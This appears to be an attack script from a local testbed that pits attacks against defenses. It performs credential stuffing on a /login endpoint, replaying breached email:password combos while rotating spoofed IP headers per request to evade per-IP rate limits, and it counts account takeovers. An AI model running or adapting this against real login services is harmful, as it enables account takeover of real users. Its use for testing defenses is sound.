"""Round 1 attack — distributed credential stuffing.

The economy: test breach-dump combos against /login. The generic per-IP rate
limit is defeated the cheap way — rotate the claimed egress every request, so the
counter never builds. The stuffer stays low-and-slow and simply replays known
passwords. Its hits are, by definition, breached passwords; that is the tell the
Round 1 defense turns against it.

    python attacks/round1_stuffer.py            # full combo list
    python attacks/round1_stuffer.py --limit 200
"""

from __future__ import annotations

import argparse
import os
import random
import sys
import time

import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import BASE_URL, DATA, RESIDENTIAL, headers, rand_ip, require_local


def run(limit=None, delay=0.0, base=BASE_URL):
    require_local(base)
    rng = random.Random(1)
    with open(os.path.join(DATA, "combo_list.txt")) as fh:
        combos = [ln.strip().split(":", 1) for ln in fh if ":" in ln]
    if limit:
        combos = combos[:limit]
    tally = {"allow": 0, "challenge": 0, "invalid": 0, "block": 0}
    takeovers = []
    for email, pw in combos:
        ip = rand_ip(RESIDENTIAL, rng)   # rotate egress -> defeats per-IP rate limit
        r = requests.post(f"{base}/login", json={"email": email, "password": pw},
                          headers=headers("bot", ip), timeout=5)
        outcome = r.json().get("outcome", "?")
        tally[outcome] = tally.get(outcome, 0) + 1
        if outcome == "allow":
            takeovers.append(email)        # a bare session: full account takeover
        if delay:
            time.sleep(delay)
    print(f"[stuffer] {len(combos)} attempts -> {tally}")
    print(f"[stuffer] account takeovers (sessions granted): {len(takeovers)}")
    return tally


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--limit", type=int, default=None)
    ap.add_argument("--delay", type=float, default=0.0)
    ap.add_argument("--url", default=BASE_URL)
    a = ap.parse_args()
    run(limit=a.limit, delay=a.delay, base=a.url)
